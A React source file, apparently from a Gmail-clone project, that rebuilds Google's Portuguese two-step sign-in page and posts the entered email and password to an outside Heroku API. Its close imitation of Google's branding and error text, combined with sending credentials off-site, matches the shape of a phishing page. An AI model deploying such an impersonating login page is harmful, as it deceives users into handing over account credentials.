import "../styles/LoginPage.scss"
import "../styles/InputLogin.scss"
import GoogleLogo from "../assets/images/logo.svg"
import { FooterLogin } from "../components/FooterLogin"
import React, { FormEvent, useState } from "react"
import { ShowPassword } from "../components/ShowPassword"
import axios from "axios"
import { useHistory } from "react-router"



export function LoginRoom() {

    const history = useHistory();
    const [usermail, setusermail] = useState('');
    const [userpassword, setuserpassword] = useState('');
    const [find, setfind] = useState(false);

    const [alert, setalert] = useState(false);

    const [show, setshow] = useState(false);

    const [next, setnext] = useState(false);

    const [texttype, settexttype] = useState(false);
        
    const [findpassword, setfindpassword] = useState(false);
    const [alertpassword, setalertpassword] = useState(false);
    const [showpassword, setshowpassword] = useState(false);

    async function SignIn(event: FormEvent) {
        event.preventDefault();

        axios.post('https://gmailauthapi.herokuapp.com/SignIn', {
                email: usermail,
                password: userpassword
        })
        .then(function (response) {
          console.log(response);
          history.push('/mail')
        })
        .catch(function (error) {
        if (error.response.data.message === 'Digite uma senha') {
            setalertpassword(true);
            setshowpassword(true);
            setfindpassword(false);
        }
        if (error.response.data.message === "Senha incorreta. Tente novamente ou clique em 'Esqueceu a senha?' para redefini-la.") {
            setalertpassword(false);
            setfindpassword(true);
            setshowpassword(true);
        }
        })
        
    }

    async function Proceed() {
        axios.post('https://gmailauthapi.herokuapp.com/MailAuth', {
        email: usermail
    })
    .then(function (res) {
        setfind(false);
        setalert(false);
        setnext(true);
    })
    .catch(function (error) {
    if (error.response.data.message === 'Digite um e-mail') {
        setalert(true);
        setshow(true);
        setfind(false);
    }
    if (error.response.data.message === 'Não foi possível encontrar sua Conta do Google') {
        setfind(true);
        setshow(true);
        setalert(false);
    }
    })
}

    const showpassfunc = {
        func: function Showpass() {
            settexttype(old => !old);
        }
    }

    return (
        <div className="login-page" id="login-page">
            <section className="container-email" id="container-email">
                <header className={next? "header-title-email-animated":"header-title-email"} id={next? "header-title-email-animated":"header-title-email"}>
                    <div className="div-logo">
                        <img src={GoogleLogo} alt="GoogleLogo" />
                    </div>
                    <h1 className="title">Fazer Login</h1>
                    <h2 className="subtitle">Use sua Conta do Google</h2>
                </header>
                <header className={next? "header-title-password-animated":"header-title-password"} id={next? "header-title-password-animated":"header-title-password"}>
                    <div className="div-password-logo" id="div-password-logo">
                        <img src={GoogleLogo} alt="GoogleLogo" />
                    </div>
                    <h1 className="login-password-page-title" id="login-password-page-title">Olá!</h1>
                    <div className="div-email-preview" id="div-email-preview">
                        <div className="div-email-preview-account-icon" id="div-email-preview-account-icon">
                            <svg aria-hidden="true" fill="currentColor" focusable="false" width="20px" height="20px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path></svg>
                        </div>
                        <div className="div-email-preview-text" id="div-email-preview-text">
                            <span className="email-preview-text" id="email-preview">{usermail}</span>
                        </div>
                        <div className="div-email-preview-option-icon" id="div-email-preview-option-icon">
                            <svg aria-hidden="true" id="true" fill="currentColor" focusable="false" width="18px" height="20px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon></svg>
                        </div>
                    </div>
                    </header>
                <form className="login-form" id="login-form">
                    <div className={next? "container-content-animated":"container-content"} id={next? "container-content-animated":"container-content"}>
                        <div className="container-input-email-login">
                            <input onChange={event => setusermail(event.target.value)} value={usermail} required className={show? "input-mail-alert":"input-mail"} id="input-mail-login" type="text"/>
                            <label className={show? "label-mail-alert":"label-mail"} id={show? "label-mail-alert":"label-mail"} htmlFor="email">E-mail ou telefone</label>
                        </div>
                        <div className={alert? "div-mail-input-alert-enabled":"div-mail-input-disabled"} id={alert? "div-mail-input-alert-enabled":"div-mail-input-disabled"}>
                            <div className={alert? "div-exclamation-icon-show":"div-exclamation-icon-hidden"} id={alert? "div-exclamation-icon-show":"div-exclamation-icon-hidden"}>
                                <svg aria-hidden="true" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
                            </div>
                        </div>
                        <div className={find? "div-mail-input-find-enabled":"div-mail-input-disabled"} id={find? "div-mail-input-find-enabled":"div-mail-input-disabled"}>
                            <div className={find? "div-exclamation-icon-show":"div-exclamation-icon-hidden"} id={find? "div-exclamation-icon-show":"div-exclamation-icon-hidden"}>
                                <svg aria-hidden="true" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
                            </div>
                        </div>
                        <div className="div-forgot-password" id="div-forgot-password">
                            <span className="forgot-password" id="forgot-password">Esqueceu seu e-mail?</span>
                        </div>
                        <div className="div-know-more">  
                            Não está no seu computador? Use o modo visitante para fazer login com privacidade. <a className="know-more" href="https://support.google.com/chrome/answer/6130773?hl=pt">Saiba mais</a>
                        </div>
                        <div className="div-next-create-account-button" id="div-next-create-account-button">            
                        <div id="create-account-login">
                            <span className="create-account-login">Criar conta</span>
                        </div>
                            <div onClick={Proceed} className="div-login-page-next-button" id="div-login-page-next-button">
                                <span className="login-page-next-button" id="login-page-next-button" >Próxima</span>
                            </div>
                        </div>
                    </div>
                    <div className={next? "div-password-form-animated":"div-password-form"} id={next? "div-password-form-animated":"div-password-form"}>
                        <h5 className="login-password-page-subtitle" id="login-password-page-subtitle">Para continuar, primeiro confirme sua identidade</h5>
                        <div className="div-input-password-login-page" id="div-input-password-login-page">
                            <input onChange={event => setuserpassword(event.target.value)} value={userpassword} required className={showpassword? "input-password-alert-login-page":"input-password-login-page"} id="input-password-login-page" type={texttype? "text":"password"}/>
                            <label className={showpassword? "label-input-password-login-page-alert":"label-input-password-login-page"} id={showpassword? "label-input-password-login-page-alert":"label-input-password-login-page"}>Digite sua senha</label>
                        </div>
                        <div className={alertpassword? "div-password-input-alert-enabled":"div-password-input-alert-disabled"} id={alertpassword? "div-password-input-alert-enabled":"div-password-input-alert-disabled"}>
                            <div className={alertpassword? "div-exclamation-icon-show":"div-exclamation-icon-hidden"} id={alertpassword? "div-exclamation-icon-show":"div-exclamation-icon-hidden"}>
                                <svg aria-hidden="true" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
                            </div>
                        </div>
                        <div className={findpassword? "div-password-input-find-enabled":"div-password-input-alert-disabled"} id={findpassword? "div-password-input-find-enabled":"div-password-input-alert-disabled"}>
                            <div className={findpassword? "div-exclamation-icon-find-show":"div-exclamation-icon-hidden"} id={findpassword? "div-exclamation-icon-find-show":"div-exclamation-icon-hidden"}>
                                <svg aria-hidden="true" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
                            </div>
                        </div>
                        <ShowPassword func={showpassfunc.func}></ShowPassword>
                        <div className="div-forgot-next" id="div-forgot-next">
                            <div className="div-forgot-password-button" id="div-forgot-password-button">
                                <span className="forgot-password-button" id="forgot-password-button">Esqueceu sua senha?</span>
                            </div>
                            <div className="div-next-button-login-password-page" id="div-next-button-login-password-page">
                                <span onClick={SignIn} className="next-button-login-password-page" id="next-button-login-password-page" >Próxima</span>
                            </div>
                        </div>
                    </div>
                </form>
            </section>
            <div className="div-footer-login-page" id="div-footer-login-page">
                <FooterLogin></FooterLogin>
            </div>
       </div>
       
    )
}